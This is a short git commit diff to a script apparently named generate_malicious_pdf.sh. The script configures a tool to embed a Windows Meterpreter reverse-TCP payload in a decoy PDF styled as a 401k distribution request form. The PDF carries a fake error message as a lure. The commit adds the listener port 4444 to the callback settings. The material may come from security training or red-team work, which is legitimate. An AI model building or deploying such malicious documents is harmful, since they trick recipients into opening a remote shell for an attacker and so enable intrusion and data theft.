9af42ec8badcd5f8fd2244d9a0b1f30e80edf6a2
ehsu4220 <31673535+ehsu4220@users.noreply.github.com>
2023-04-24 16:10:36 -0400

    Specify port for embedded pdf

--- generate_malicious_pdf.sh
+++ generate_malicious_pdf.sh
@@ -7,5 +7,6 @@ set INFILENAME 401k-distribution-request-form.pdf; \
 set LAUNCH_MESSAGE Couldn't Open PDF: Something's keeping this PDF from opening; \
 set PAYLOAD windows/meterpreter/reverse_tcp; \
 set LHOST "$(hostname -I | cut -d' ' -f1)"; \
+set LPORT 4444; \
 exploit;"
 
